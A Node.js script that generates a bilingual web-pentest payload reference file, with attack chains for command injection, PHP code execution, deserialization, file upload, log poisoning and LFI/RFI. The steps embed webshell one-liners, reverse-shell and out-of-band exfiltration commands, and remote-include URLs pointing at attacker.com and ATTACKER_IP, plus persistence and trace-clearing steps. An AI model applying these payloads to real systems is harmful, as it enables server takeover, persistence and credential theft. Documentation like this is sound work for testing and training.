import { readFileSync, writeFileSync } from 'node:fs';

const filePath = 'src/data/webPayloads.ts';
let content = readFileSync(filePath, 'utf8');
const esc = s => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
const escSq = s => s.replace(/'/g, "\\'").replace(/\r?\n/g, '\\n');

const chain = (titleZh, titleEn, descZh, descEn) =>
  `      { title: { zh: '${escSq(titleZh)}', en: '${escSq(titleEn)}' }, description: { zh: '${escSq(descZh)}', en: '${escSq(descEn)}' } },`;

const payloads = [
  {
    id: 'rce-command-injection',
    chain: [
      chain('识别注入点','Identify injection point','通过参数探测、功能分析和代理历史定位接受系统命令的参数，确认分隔符(;|&`\\n)是否被过滤。','Locate parameters accepting system commands through probing, feature analysis, and proxy history; confirm which separators are filtered.'),
      chain('基础命令探测','Basic command probe','使用 ;id、|whoami、`uname -a` 等基础命令测试注入，通过响应差异、时间延迟(ping -c 5 127.0.0.1)或 DNS 外带确认执行。','Test injection with basic commands like ;id, |whoami, `uname -a`; confirm execution via response differences, time delays, or DNS out-of-band.'),
      chain('WAF 绕过','WAF bypass','当基础 payload 被拦截时尝试换行符(%0a)、IFS 替代空格、Base64 编码执行、反引号、${IFS}、通配符等绕过技术。','When basic payloads are blocked, try newline injection (%0a), IFS space alternatives, base64-encoded execution, backticks, ${IFS}, and wildcard bypass techniques.'),
      chain('建立反向 Shell','Establish reverse shell','确认注入后使用 bash/python/perl/powershell 反向 shell payload 建立交互会话，或写入 WebShell 到 Web 目录获取持久访问。','After confirming injection, establish an interactive session with bash/python/perl/powershell reverse shells, or write a WebShell for persistent access.'),
      chain('后渗透信息收集','Post-exploitation recon','获取 shell 后收集内网信息、提取凭据(env/config/历史文件)、建立持久化(Crontab/SSH key)并清理入侵痕迹。','After gaining shell access, collect internal network info, extract credentials, establish persistence, and clean intrusion traces.'),
    ],
    analy: { zh: '命令注入是最直接的 RCE 形式，当用户输入未经过滤进入 system/exec/popen/shell_exec 等函数时发生。攻击面包括管道、重定向、命令分隔符(;|&`\\n)、内联执行($()``)和通配符注入。盲注场景需依赖时间延迟或 DNS 外带确认执行。', en: 'Command injection is the most direct form of RCE, occurring when unfiltered user input reaches system execution functions. The attack surface includes pipes, redirects, command separators, inline execution, and wildcard injection. Blind scenarios rely on time delays or DNS out-of-band for confirmation.' },
    refs: ['https://owasp.org/www-community/attacks/Command_Injection','https://portswigger.net/web-security/os-command-injection','https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection'],
  },
  {
    id: 'rce-php',
    chain: [
      chain('定位代码执行入口','Locate code execution entry','通过黑盒调试和源码审计定位 eval/assert/preg_replace/create_function 等危险函数的调用点，确认用户输入能否进入这些函数。','Locate dangerous function call sites (eval, assert, preg_replace, create_function) through black-box debugging and source auditing; confirm user input reaches these functions.'),
      chain('注入 PHP 一句话','Inject PHP one-liner','使用 <?php system($_GET["cmd"]);?> 等一句话木马获取命令执行，通过回调函数、字符串拼接、Base64 解码等绕过关键字检测。','Use one-liner shells like <?php system($_GET["cmd"]);?> for command execution; bypass keyword detection via callbacks, string concatenation, and Base64 decoding.'),
      chain('绕过 disable_functions','Bypass disable_functions','当 system/exec 被禁用时，利用 LD_PRELOAD 劫持、FFI::cdef、IMAP open 绕过、GCONV_PATH 等方式突破函数限制。','When system/exec are disabled, bypass via LD_PRELOAD hooking, FFI::cdef, IMAP open bypass, GCONV_PATH, and other techniques.'),
      chain('建立持久化','Establish persistence','写入多形态 WebShell(无字母数字、回调函数、反射调用)、添加 .user.ini auto_prepend_file 或修改 Crontab 实现持久化。','Write polymorphic WebShells (non-alphanumeric, callback-based, reflection), add .user.ini auto_prepend_file, or modify crontab for persistence.'),
    ],
    analy: { zh: 'PHP 代码执行因 eval/assert/preg_replace /e/create_function 等函数接收用户输入导致。即使 disable_functions 限制 system/exec，仍可通过 LD_PRELOAD、FFI、IMAP 绕过、GCONV 路径等技术突破。配合 PHP 反序列化或 Phar 反序列化可构造更隐蔽的利用链。', en: 'PHP code execution occurs when dangerous functions receive user input. Even with disable_functions restricting system/exec, bypasses exist via LD_PRELOAD, FFI, IMAP, and GCONV techniques. Combined with PHP or Phar deserialization, stealthier exploit chains can be constructed.' },
    refs: ['https://owasp.org/www-community/attacks/Code_Injection','https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/PHP%20juggling%20type','https://book.hacktricks.wiki/en/pentesting-web/php-tricks-esp/index.html'],
  },
  {
    id: 'rce-php-filter',
    chain: [
      chain('确认 Filter 可用','Confirm filter availability','通过 php://filter/read=convert.base64-encode/resource=index.php 读取源码确认 Filter 可用，验证字符集转换是否支持。','Read source via php://filter/read=convert.base64-encode/resource=index.php to confirm filter availability and charset conversion support.'),
      chain('生成 Filter Chain','Generate filter chain','使用 php_filter_chain_generator 工具根据目标 PHP 版本生成完整的 Filter Chain，注意选择合适的字符集组合。','Use php_filter_chain_generator to generate a complete filter chain for the target PHP version, selecting appropriate charset combinations.'),
      chain('注入 Payload','Inject payload','将生成的 Filter Chain 注入 LFI 参数，通过多层 iconv 转换逐字节拼出 PHP 代码并执行。','Inject the generated filter chain into the LFI parameter, byte-by-byte constructing PHP code through multi-layer iconv conversion for execution.'),
      chain('验证执行','Verify execution','通过 cmd 参数执行 id/whoami 确认代码执行成功，随后建立反向 Shell 或获取源码获取进一步权限。','Confirm code execution via cmd parameter with id/whoami, then establish a reverse shell or read source code for further privilege escalation.'),
    ],
    analy: { zh: 'PHP Filter Chain 通过 php://filter 的 iconv 字符集转换逐字节操作，在内存中拼出任意 PHP 代码。这是目前最先进的 LFI-to-RCE 技术之一，可绕过 disable_functions 和 open_basedir，无需文件落地。', en: 'PHP filter chains leverage iconv charset conversion in php://filter for byte-by-byte manipulation, constructing arbitrary PHP code in memory. This is one of the most advanced LFI-to-RCE techniques, bypassing disable_functions and open_basedir without writing files to disk.' },
    refs: ['https://github.com/synacktiv/php_filter_chain_generator','https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters.html'],
  },
  {
    id: 'rce-cmd-blind',
    chain: [
      chain('确认盲注场景','Confirm blind scenario','当命令执行结果不直接回显时，通过请求时间差异、响应长度变化或错误信息判断是否存在注入点。','When command output is not directly visible, judge injection presence through request timing differences, response length changes, or error messages.'),
      chain('时间延迟验证','Time-based verification','使用 sleep 5、ping -n 5 127.0.0.1 等延迟命令通过请求耗时确认命令被执行。','Use delay commands like sleep 5 or ping -n 5 127.0.0.1 to confirm execution through request duration.'),
      chain('DNS/HTTP 外带','DNS/HTTP out-of-band','使用 nslookup {RANDOM}.{DNSLOG}、curl http://{DNSLOG}/`whoami` 等外带技术将执行结果通过 DNS 或 HTTP 传出。','Use out-of-band techniques like nslookup or curl to exfiltrate execution results via DNS or HTTP to a controlled server.'),
      chain('写入 WebShell','Write WebShell','确认注入后将 PHP/ASP 一句话通过 echo/printf 写入 Web 可访问目录，再用浏览器触发命令执行。','After confirming injection, write a PHP/ASP one-liner via echo/printf to a web-accessible directory and trigger command execution via browser.'),
      chain('建立反向连接','Establish reverse connection','使用 bash/python/powershell 反向 shell 获取交互式终端，推荐优先尝试 bash -i >& /dev/tcp 和 Python pty 方案。','Use bash/python/powershell reverse shells for an interactive terminal; prefer bash -i >& /dev/tcp and Python pty.' ),
    ],
    analy: { zh: '盲命令注入无法直接看到输出，需通过时间延迟(sleep/ping)、DNS外带(curl dnslog/`cmd`)、文件写入(> /var/www/html/s.php)等侧信道确认。最可靠的利用路径是将 WebShell 写入可执行目录或建立反向 Shell。', en: 'Blind command injection requires side-channel confirmation via time delays, DNS out-of-band, or file writes since output is not visible. The most reliable exploitation path is writing a WebShell to an executable directory or establishing a reverse shell.' },
    refs: ['https://owasp.org/www-community/attacks/Command_Injection','https://portswigger.net/web-security/os-command-injection'],
  },
  {
    id: 'rce-deserialize',
    chain: [
      chain('识别序列化格式','Identify serialization format','通过请求参数(长字符串/Base64/hex)、响应特征(魔术字节 aced0005/rO0)和 Content-Type 识别序列化数据和格式。','Identify serialized data and format through request parameters, response characteristics (magic bytes), and Content-Type headers.'),
      chain('构造 Gadget Chain','Construct gadget chain','使用 ysoserial/PHPGGC/ysoserial.net 等工具根据目标框架和依赖库选择可利用的 Gadget Chain。','Use ysoserial, PHPGGC, ysoserial.net, or similar tools to select exploitable gadget chains based on the target framework and dependencies.'),
      chain('触发反序列化','Trigger deserialization','将恶意序列化 payload 注入请求参数/Cookie/文件上传等入口点，触发服务端反序列化执行。','Inject malicious serialized payloads into request parameters, cookies, file uploads, or other entry points to trigger server-side deserialization.'),
      chain('绕过防护','Bypass defenses','当直接反序列化被 WAF 拦截时，使用编码混淆、JNDI/LDAP 重定向、BCEL ClassLoader 等间接技术绕过。','When direct deserialization is blocked by WAF, use encoding obfuscation, JNDI/LDAP redirects, BCEL ClassLoader, and other indirect techniques.' ),
    ],
    analy: { zh: '不安全的反序列化是 OWASP Top 10 高危漏洞。当应用反序列化不可信数据时，攻击者通过构造恶意序列化对象(POP链)触发任意方法调用实现 RCE。Java/PHP/Python/.NET/Ruby 各有成熟的利用工具链。', en: 'Insecure deserialization is an OWASP Top 10 vulnerability. When applications deserialize untrusted data, attackers construct malicious serialized objects (POP chains) triggering arbitrary method calls for RCE. Mature toolchains exist for Java, PHP, Python, .NET, and Ruby.' },
    refs: ['https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data','https://portswigger.net/web-security/deserialization','https://github.com/frohoff/ysoserial'],
  },
  {
    id: 'rce-deserialize-php',
    chain: [
      chain('识别反序列化点','Identify deserialization point','在参数、Cookie、Session 中搜索序列化特征(O:N:"ClassName":N:{...})，或通过 Phar:// 触发隐式反序列化。','Search for serialization patterns in parameters, cookies, and sessions, or trigger implicit deserialization via phar://.'),
      chain('审计 Gadget','Audit gadgets','通过源码审计或 phpggc -l 列举目标框架可利用的 Gadget Chain，选择最适配的利用路径。','Audit source code or use phpggc -l to list exploitable gadget chains for the target framework; select the most suitable exploitation path.'),
      chain('生成并注入 Payload','Generate and inject payload','使用 PHPGGC 生成序列化 payload，通过 POST/Cookie/文件上传注入，注意调整参数匹配目标类结构。','Generate serialized payloads with PHPGGC, inject via POST/cookie/file upload, adjusting parameters to match the target class structure.'),
      chain('升级为 RCE','Escalate to RCE','触发反序列化后执行系统命令或写入 WebShell，常见利用链包括 Monolog/RCE、SwiftMailer、Guzzle 和 Laravel。','After triggering deserialization, execute system commands or write a WebShell; common chains include Monolog, SwiftMailer, Guzzle, and Laravel.'),
    ],
    analy: { zh: 'PHP 反序列化依赖魔术方法(__destruct/__wakeup/__toString/__call/__invoke)的自动调用。PHPGGC 覆盖 Laravel/ThinkPHP/WordPress/Monolog 等主流框架的 Gadget Chain。Phar:// 反序列化可在无显式 unserialize() 的情况下触发。', en: 'PHP deserialization relies on automatic magic method invocation. PHPGGC covers gadget chains for Laravel, ThinkPHP, WordPress, Monolog, and other major frameworks. Phar:// deserialization can trigger without explicit unserialize() calls.' },
    refs: ['https://github.com/ambionics/phpggc','https://portswigger.net/web-security/deserialization/exploiting'],
  },
  {
    id: 'rce-deserialize-java',
    chain: [
      chain('识别 Java 序列化数据','Identify Java serialized data','搜索 aced0005 魔术字节、Base64 编码的 rO0 前缀、HTTP 请求中的长二进制 payload 确认 Java 序列化数据。','Search for aced0005 magic bytes, Base64-encoded rO0 prefix, and long binary payloads in HTTP requests to identify Java serialized data.'),
      chain('DNS 探测','DNS probe','使用 URLDNS gadget chain 触发 DNS 查询确认反序列化点存在，无需依赖易受攻击的库。','Use the URLDNS gadget chain to trigger DNS queries confirming the deserialization point without requiring vulnerable libraries.'),
      chain('利用 JNDI 注入','Exploit JNDI injection','结合 JNDI/LDAP 注入(jndi:ldap://ATTACKER/Exploit)远程加载恶意类，绕过 classpath 限制实现 RCE。','Combine with JNDI/LDAP injection to remotely load malicious classes, bypassing classpath restrictions for RCE.'),
      chain('使用 ysoserial','Use ysoserial','根据目标组件选择 CommonsCollections/CommonsBeanutils/Spring 等利用链，生成最终 payload 并注入。','Select exploitation chains (CommonsCollections, CommonsBeanutils, Spring) based on target components, generate the final payload, and inject it.'),
    ],
    analy: { zh: 'Java 反序列化以 aced0005 魔术字节为特征。ysoserial 提供 CommonsCollections/URLDNS/CommonsBeanutils 等多条利用链。Log4Shell(CVE-2021-44228)是经典的反序列化+JNDI 组合攻击，通过 ${jndi:ldap://} 触发远程类加载。', en: 'Java deserialization is characterized by aced0005 magic bytes. ysoserial provides multiple chains. Log4Shell (CVE-2021-44228) is a classic deserialization+JNDI combination, triggering remote class loading via ${jndi:ldap://}.' },
    refs: ['https://github.com/frohoff/ysoserial','https://portswigger.net/web-security/deserialization/exploiting','https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html'],
  },
  {
    id: 'rce-file-upload',
    chain: [
      chain('上传 WebShell','Upload WebShell','使用文件上传功能将 PHP/ASP/JSP 一句话木马写入服务器，选择适合目标语言的 WebShell 变体。','Upload PHP/ASP/JSP one-liner shells through the file upload feature, selecting the appropriate WebShell variant for the target language.'),
      chain('绕过上传限制','Bypass upload restrictions','通过扩展名变体(.php.jpg)、Content-Type 伪造(image/jpeg)、魔术字节注入(GIF89a)和平台解析特性突破限制。','Bypass restrictions using extension variants (.php.jpg), Content-Type spoofing (image/jpeg), magic byte injection (GIF89a), and platform parsing quirks.'),
      chain('定位上传路径','Locate upload path','通过响应头、HTML 回显、目录爆破或常见上传路径(/uploads/、/files/)找到上传文件的可访问 URL。','Find the uploaded file’s accessible URL via response headers, HTML output, directory brute-force, or common upload paths.'),
      chain('触发命令执行','Trigger command execution','通过 HTTP 请求访问 WebShell 并传递 cmd 参数执行系统命令，或建立反向 Shell 获取交互式终端。','Access the WebShell via HTTP with a cmd parameter to execute system commands, or establish a reverse shell for an interactive terminal.'),
    ],
    analy: { zh: '文件上传 RCE 是最经典的 Web 攻击路径——写入 WebShell 后通过 HTTP 触发命令执行。PHP 一句话(<?php system($_GET["cmd"]);?>)、ASPX、JSP、Python 各有变体。成功关键：绕过扩展名/MIME/内容三层验证，确保目录可执行脚本。', en: 'File upload RCE is the most classic web attack path — write a WebShell and trigger command execution via HTTP. Variants exist for PHP, ASPX, JSP, and Python. Success depends on bypassing extension, MIME, and content validation while ensuring the directory allows script execution.' },
    refs: ['https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload','https://github.com/tennc/webshell','https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files'],
  },
  {
    id: 'rce-include',
    chain: [
      chain('识别文件包含点','Identify file include point','定位 ?page=/file=/include= 等参数，测试基础路径遍历(../)和 PHP 伪协议(php://filter)确认 LFI 存在。','Locate parameters like ?page=, ?file=, ?include= and test basic path traversal (../) and PHP wrappers (php://filter) to confirm LFI.'),
      chain('读取源码','Read source code','使用 php://filter/convert.base64-encode/resource= 读取 PHP 源码，从中发现数据库凭据、文件路径和其他注入点。','Read PHP source code via php://filter/convert.base64-encode/resource= to discover database credentials, file paths, and other injection points.'),
      chain('升级 LFI 到 RCE','Escalate LFI to RCE','尝试 php://input 注入执行、data:// 伪协议、日志投毒(/var/log/apache2/access.log)和 Session 文件包含等路径升级为 RCE。','Escalate to RCE via php://input injection, data:// pseudo-protocol, log poisoning, and session file inclusion.'),
      chain('建立持久访问','Establish persistent access','写入 WebShell 或修改系统配置(Crontab/authorized_keys/.user.ini)建立持久化访问通道。','Write a WebShell or modify system configuration (crontab, authorized_keys, .user.ini) to establish persistent access.'),
    ],
    analy: { zh: '文件包含(LFI)本身只能读文件，但可升级为 RCE：php://input 注入代码、data:// 伪协议执行、日志投毒(在 User-Agent 注入 PHP 代码后包含日志)、Session 文件包含、PHP Filter Chain 和 /proc/self/environ 注入。RFI 则通过 HTTP/FTP 直接加载远程代码。', en: 'LFI itself only reads files but can be escalated to RCE: php://input injection, data:// pseudo-protocol, log poisoning (inject PHP in User-Agent then include logs), session file inclusion, PHP filter chains, and /proc/self/environ injection. RFI directly loads remote code via HTTP/FTP.' },
    refs: ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion','https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html'],
  },
  {
    id: 'rce-log-poison',
    chain: [
      chain('识别可写日志路径','Identify writable log paths','确认目标服务器类型和日志路径(/var/log/apache2/access.log、/var/log/nginx/access.log、/var/log/vsftpd.log)。','Identify the server type and log paths (Apache, Nginx, vsftpd, SSH auth).'),
      chain('注入 PHP 代码','Inject PHP code','在 HTTP 请求的 User-Agent/Referer/URL 中携带 <?php system($_GET["cmd"]);?>，访问目标触发日志写入。','Carry <?php system($_GET["cmd"]);?> in User-Agent, Referer, or URL fields and access the target to trigger log writes.'),
      chain('包含污染日志','Include poisoned log','通过 LFI 参数包含日志文件路径，被注入的 PHP 代码将被解释执行。','Include the log file path via the LFI parameter; the injected PHP code will be parsed and executed.'),
      chain('获取 Shell','Obtain shell','成功执行后传递 cmd 参数获取命令执行，随后建立反向 Shell 或获取更高权限。','After successful execution, pass cmd parameters for command execution, then establish a reverse shell or escalate privileges.'),
    ],
    analy: { zh: '日志投毒(log poisoning)是 LFI-to-RCE 最高效路径。在 User-Agent/Referer/URL 中注入 PHP 代码写入日志后通过 LFI 包含执行。常见目标：/var/log/apache2/access.log、/var/log/nginx/access.log、SSH auth.log、邮件日志。', en: 'Log poisoning is the most efficient LFI-to-RCE path. Inject PHP code into User-Agent/Referer/URL, which is written to logs; then include those logs via LFI for execution. Common targets: Apache/Nginx access logs, SSH auth logs, mail logs.' },
    refs: ['https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-log-poisoning.html','https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion'],
  },
  {
    id: 'rce-image',
    chain: [
      chain('制作图片马','Create image webshell','使用 copy /b normal.jpg + shell.php webshell.jpg(GIF89a头+PHP)或 exiftool -Comment 注入代码到图片元数据。','Create image webshells using copy /b (GIF89a header + PHP) or exiftool -Comment to inject code into image metadata.'),
      chain('上传图片马','Upload image webshell','通过头像/相册等功能上传图片马，利用扩展名(.jpg/.png)和魔术字节(GIF89a/\x89PNG)绕过内容检查。','Upload the image webshell through avatar/album features, using legitimate extensions and magic bytes to bypass content checks.'),
      chain('LFI 包含执行','LFI include execution','通过文件包含漏洞引用上传的图片马路径，PHP 代码在图片数据中的部分会被解析执行。','Reference the uploaded image shell path via an LFI vulnerability; the PHP code embedded in the image will be parsed and executed.'),
      chain('解析漏洞利用','Parser exploitation','配合 .htaccess AddType application/x-httpd-php .jpg 或 IIS/路径解析漏洞，使图片直接被当作脚本执行。','Combine with .htaccess AddType or IIS path parsing vulnerabilities to make images directly executable as scripts.' ),
    ],
    analy: { zh: '图片马(image webshell)在合法图片内嵌入 PHP/ASP 代码绕过内容检测。制作方法：copy /b(二进制合并)、exiftool 元数据注入、手写图片头+代码。需配合 LFI 或解析漏洞(.htaccess AddType/IIS 解析)使图片被当作脚本执行。', en: 'Image webshells embed PHP/ASP code within legitimate images to bypass content detection. Creation methods: copy /b (binary merge), exiftool metadata injection, or manual header+code prepend. Requires LFI or parsing vulnerabilities (.htaccess AddType / IIS parsing) to execute.' },
    refs: ['https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html','https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload'],
  },
  {
    id: 'rce-htaccess',
    chain: [
      chain('上传 .htaccess','Upload .htaccess','通过文件上传功能上传恶意 .htaccess 文件，如果上传目录为 Apache 且允许覆盖配置，文件将被解析。','Upload a malicious .htaccess file via the file upload feature; if the directory is Apache-served and allows config override, the file is parsed.'),
      chain('配置 AddType 映射','Configure AddType mapping','使用 AddType application/x-httpd-php .jpg 将所有 .jpg 文件映射为 PHP 执行，或 AddHandler 指定处理程序。','Use AddType application/x-httpd-php .jpg to map all .jpg files to PHP execution, or AddHandler to specify a handler.'),
      chain('上传图片 WebShell','Upload image WebShell','上传包含 PHP 代码的 .jpg 文件，由于 .htaccess 规则，该文件将被 Apache 当作 PHP 脚本执行。','Upload a .jpg file containing PHP code; due to the .htaccess rule, Apache will execute it as a PHP script.'),
      chain('.user.ini 持久化','.user.ini persistence','针对 PHP-FPM 环境上传 .user.ini 配置 auto_prepend_file=shell.jpg，使所有 PHP 页面加载时自动包含后门。','For PHP-FPM environments, upload .user.ini with auto_prepend_file=shell.jpg to auto-include the backdoor on every PHP page load.'),
    ],
    analy: { zh: '.htaccess 是 Apache 的分布式配置文件，攻击者上传恶意 .htaccess 覆盖目录解析规则，使图片被当作 PHP 执行。.user.ini(PHP-FPM)可通过 auto_prepend_file/auto_append_file 实现无文件后门。这类攻击隐蔽持久，常被忽视。', en: '.htaccess is Apache’s distributed configuration file — attackers upload malicious .htaccess to override directory parsing rules. .user.ini (PHP-FPM) can implement fileless backdoors via auto_prepend_file/auto_append_file. These attacks are stealthy, persistent, and often overlooked.' },
    refs: ['https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html','https://httpd.apache.org/docs/current/howto/htaccess.html'],
  },

  // ==================== LFI/RFI ====================
  {
    id: 'lfi-basic',
    chain: [
      chain('识别包含参数','Identify include parameter','定位 ?page=/file=/include=/template= 等参数的页面，尝试 ../ 路径遍历确认参数是否进入文件包含函数。','Locate pages with ?page=, ?file=, ?include=, ?template= parameters; test ../ traversal to confirm the parameter reaches a file include function.'),
      chain('读取系统敏感文件','Read system sensitive files','依次读取 /etc/passwd、/etc/hosts、/proc/version、应用配置文件(.env/config.php)和源码确认文件读取权限。','Read /etc/passwd, /etc/hosts, /proc/version, app configs (.env, config.php), and source code to confirm file read permissions.'),
      chain('源码审计与信息收集','Source auditing and recon','通过 php://filter base64 读取 PHP 源码，分析代码逻辑以发现数据库凭据、API 密钥、其他注入点和文件路径。','Read PHP source via php://filter base64; analyze code logic to discover DB credentials, API keys, additional injection points, and file paths.'),
      chain('LFI 升级 RCE','Escalate LFI to RCE','根据源码发现和环境信息选择合适的升级路径：日志投毒、Session 包含、PHP Filter Chain、/proc/self/environ 注入或 php://input。','Based on source findings and environment info, choose an escalation path: log poisoning, session inclusion, PHP filter chain, /proc/self/environ injection, or php://input.'),
    ],
    analy: { zh: '本地文件包含(LFI)允许读取服务器任意文件。/etc/passwd、源码(php://filter base64 读取)、配置文件(.env)和日志是首要目标。单一 LFI 只为信息泄露，但可通过日志投毒、Session 包含、PHP Filter Chain 等升级为 RCE。', en: 'LFI allows reading arbitrary server files. /etc/passwd, source code (via php://filter base64), config files (.env), and logs are primary targets. LFI alone is information disclosure, but can escalate to RCE via log poisoning, session inclusion, or PHP filter chains.' },
    refs: ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion','https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html'],
  },
  {
    id: 'rfi-basic',
    chain: [
      chain('确认 RFI 条件','Confirm RFI conditions','检查 allow_url_include=On 和 allow_url_fopen=On 配置，确认目标 PHP 环境是否允许远程文件包含。','Check allow_url_include=On and allow_url_fopen=On configurations to confirm whether the target PHP environment allows remote file inclusion.'),
      chain('托管恶意脚本','Host malicious script','在攻击者控制的服务器上放置恶意 PHP 文件(如 shell.txt)，确保可通过 HTTP 直接访问。','Host a malicious PHP file (e.g., shell.txt) on an attacker-controlled server, ensuring it is directly accessible via HTTP.'),
      chain('远程包含执行','Remote include execution','通过 LFI 参数引用 http://attacker.com/shell.txt?cmd=id，恶意代码在目标服务器上下载并执行。','Reference http://attacker.com/shell.txt?cmd=id via the LFI parameter; the malicious code is downloaded and executed on the target server.'),
      chain('SMB 协议利用','SMB protocol exploitation','在 Windows+PHP 环境中尝试 SMB 共享包含(\\\\ATTACKER_IP\\share\\shell.php)，绕过 HTTP 被禁的限制。','In Windows+PHP environments, attempt SMB share inclusion (\\\\ATTACKER_IP\\share\\shell.php) to bypass HTTP restrictions.' ),
    ],
    analy: { zh: '远程文件包含(RFI)比 LFI 更危险——直接通过 HTTP/FTP/SMB 加载并执行远程代码。需要 allow_url_include=On。即使 HTTP 被禁，Windows 环境下 SMB 协议可能仍可用于远程包含。PHP 的流封装器(stream wrapper)机制是 RFI 的底层支撑。', en: 'RFI is more dangerous than LFI — it directly loads and executes remote code via HTTP/FTP/SMB. Requires allow_url_include=On. Even if HTTP is disabled, SMB protocol may still work for remote inclusion in Windows environments. PHP stream wrappers underpin RFI functionality.' },
    refs: ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion'],
  },
  {
    id: 'lfi-log-poison',
    chain: [
      chain('识别日志路径','Identify log paths','确认服务器类型对应的日志路径：Apache /var/log/apache2/access.log、Nginx /var/log/nginx/access.log、SSH /var/log/auth.log 等。','Identify log paths for the server type: Apache /var/log/apache2/access.log, Nginx /var/log/nginx/access.log, SSH /var/log/auth.log, etc.'),
      chain('注入 PHP 代码','Inject PHP code','在 User-Agent/Referer/URI 中携带 <?php system($_GET["cmd"]);?> 发起请求，代码被写入访问日志。','Carry <?php system($_GET["cmd"]);?> in User-Agent, Referer, or URI fields when making requests; the code is written to access logs.'),
      chain('包含日志文件','Include log file','通过 LFI 参数包含日志文件路径，嵌入的 PHP 代码被解析执行。','Include the log file path via the LFI parameter; the embedded PHP code is parsed and executed.'),
      chain('验证并持久化','Verify and persist','通过 cmd 参数执行命令确认利用成功，随后写入 WebShell 或修改 Crontab 建立持久访问。','Confirm successful exploitation via cmd parameter, then write a WebShell or modify crontab for persistent access.' ),
    ],
    analy: { zh: '日志投毒是 LFI-to-RCE 最高效路径。在 User-Agent/Referer/URL 中注入 PHP 代码写入日志后通过 LFI 包含执行。Apache/Nginx 访问日志和 SSH auth.log 是最常见目标。注意日志可能被 rotate 或截断，需多次尝试。', en: 'Log poisoning is the most efficient LFI-to-RCE path. Inject PHP code into User-Agent/Referer/URL to write logs, then include those logs via LFI. Apache/Nginx access logs and SSH auth.log are the most common targets. Logs may be rotated or truncated — multiple attempts may be needed.' },
    refs: ['https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-log-poisoning.html'],
  },
  {
    id: 'lfi-wrapper',
    chain: [
      chain('探测可用 Wrapper','Probe available wrappers','依次测试 php://filter、php://input、data://、expect://、zip:// 等 wrapper 是否被允许，记录支持的协议。','Test each wrapper — php://filter, php://input, data://, expect://, zip:// — to check availability and record supported protocols.'),
      chain('php://filter 读源码','Read source via php://filter','使用 php://filter/read=convert.base64-encode/resource=index.php 读取 PHP 源码文件，Base64 解码后分析代码。','Read PHP source files via php://filter/read=convert.base64-encode/resource=index.php; Base64-decode and analyze the code.'),
      chain('php://input 执行','Execute via php://input','POST 请求中包含 <?php system($_GET["cmd"]);?> 并以 php://input 为包含路径，代码将在服务端执行。','Include PHP code in POST body with php://input as the include path; the code executes server-side.'),
      chain('data:// 和 expect://','data:// and expect://','data://text/plain;base64,<base64> 直接在 URL 中嵌入代码；expect://id 通过 PECL expect 扩展直接执行命令。','data://text/plain;base64,<base64> embeds code directly in URL; expect://id executes commands via the PECL expect extension.' ),
    ],
    analy: { zh: 'PHP 伪协议(wrapper)是 LFI 利用的核心工具集：php://filter 读取编码源码、php://input 执行 POST 正文代码、data:// 直接嵌入代码、expect://(需 PECL)直接执行命令、zip:///phar:// 从压缩包执行。每种 wrapper 有不同的利用条件(allow_url_include/open_basedir 等)。', en: 'PHP wrappers are the core LFI exploitation toolkit: php://filter reads encoded source, php://input executes POST body code, data:// embeds code directly, expect:// executes commands, zip:///phar:// executes from archives. Each wrapper has different exploitation conditions.' },
    refs: ['https://www.php.net/manual/en/wrappers.php','https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html'],
  },
  {
    id: 'lfi-traversal',
    chain: [
      chain('基础路径遍历','Basic path traversal','使用 ../ 序列突破目录限制，从 2 层遍历测试到 10 层，确认可读取的文件边界。','Use ../ sequences to break directory restrictions, testing from 2 to 10 levels to confirm readable file boundaries.'),
      chain('编码绕过过滤','Encoding filter bypass','当 ../ 被过滤时，尝试 URL 编码(..%2f)、双重编码(..%252f)、UTF-8 变体(..%c0%af)和 Unicode 归一化绕过。','When ../ is filtered, try URL encoding (..%2f), double encoding (..%252f), UTF-8 variants (..%c0%af), and Unicode normalization bypass.'),
      chain('平台特定路径','Platform-specific paths','Linux 目标读取 /etc/passwd、/proc/self/environ；Windows 目标使用 ..\\..\\windows\\win.ini 和盘符 C:\\。','Linux targets: read /etc/passwd, /proc/self/environ; Windows targets: use ..\\..\\windows\\win.ini and drive letters.'),
      chain('自动化批量探测','Automated bulk probing','使用 DotDotPwn/ffuf 配合路径字典批量测试常见敏感文件，扩大信息收集覆盖面。','Use DotDotPwn/ffuf with path dictionaries to bulk-test common sensitive files, expanding information gathering coverage.' ),
    ],
    analy: { zh: '目录遍历是 LFI 基础技术。当 ../ 被过滤，用 URL/Unicode/双写编码绕过。Linux(/etc/passwd、/proc/)和 Windows(C:\\windows\\win.ini、SAM)路径差异提供额外绕过空间。路径归一化缺陷(先解码再校验 vs 先校验再解码)是关键利用点。', en: 'Directory traversal is the foundation of LFI. When ../ is filtered, use URL/Unicode/double-write encodings. Linux and Windows path differences provide additional bypass angles. Path normalization flaws (decode-then-check vs check-then-decode) are key exploitation points.' },
    refs: ['https://owasp.org/www-community/attacks/Path_Traversal','https://portswigger.net/web-security/file-path-traversal'],
  },
  {
    id: 'lfi-php-filter',
    chain: [
